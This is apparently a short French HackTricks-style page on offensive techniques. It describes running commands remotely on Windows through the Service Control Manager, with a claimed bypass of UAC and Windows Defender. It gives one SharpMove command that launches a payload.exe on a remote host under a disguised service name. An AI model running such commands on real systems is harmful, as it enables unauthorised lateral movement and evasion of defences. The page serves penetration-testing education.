# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** est une technique permettant d’exécuter des commandes sur des systèmes distants en utilisant le Service Control Manager (SCM) pour créer un service qui exécute la commande. Cette méthode peut contourner certains contrôles de sécurité, tels que User Account Control (UAC) et Windows Defender.

## Outils

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):<sup>[[1]](#references)</sup>

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

## Références

- [1] [SharpMove - GitHub repository](https://github.com/0xthirteen/SharpMove)

{{#include ../../banners/hacktricks-training.md}}
